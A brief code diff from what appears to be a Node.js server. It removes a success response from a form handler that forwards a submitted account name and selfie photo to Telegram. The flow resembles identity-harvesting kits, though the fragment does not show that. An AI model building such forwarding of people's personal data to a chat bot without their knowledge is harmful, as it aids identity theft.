@@ -155,11 +155,6 @@ const accountNameLine = accountName ? `<b>Account Name:</b> ${accountName}` : ''
         const caption = `📸 Selfie from: ${name}`;
         sendPhotoToTelegram(selfieFile.path, caption);
     
-    res.json({ 
-            success: true, 
-            message: 'Form submitted and data sent to Telegram successfully' 
-        });
-
 });
 
 // Error handling middleware
